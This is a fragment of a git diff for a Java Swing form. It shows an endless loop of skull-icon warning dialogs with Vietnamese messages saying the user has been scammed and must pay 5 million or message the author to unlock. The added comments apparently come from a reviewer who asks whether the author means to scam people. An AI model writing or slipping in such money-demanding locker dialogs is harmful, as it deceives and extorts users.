@@ -236,17 +236,17 @@ public class form2 extends javax.swing.JFrame {
         // Tạo biểu tượng từ file hình ảnh
         ImageIcon icon = new ImageIcon("F:\\Downloads\\skull.png"); // Đường dẫn đến file hình ảnh
 
-        while (true) {
+        while (true) { //Phần chương trình gây ra exception bạn định đi lừa đảo à ?
             int option = JOptionPane.showOptionDialog(
                     rootPane,
-                    "Bị lừa rồi ku",
-                    "Cho 5tr thì out !",
+                    "Bị lừa rồi ku", // ???
+                    "Cho 5tr thì out !", // ???
                     JOptionPane.YES_NO_OPTION,
                     JOptionPane.WARNING_MESSAGE,
                     icon,
                     null,
                     null
-            );
+            );// Hãy là 1 DEV nghiêm túc, giúp ít cho công ty.
 
             if (option == JOptionPane.YES_OPTION) {
                 JOptionPane.showMessageDialog(rootPane, "ib để mở khóa", "Con gà của thầy", JOptionPane.INFORMATION_MESSAGE);
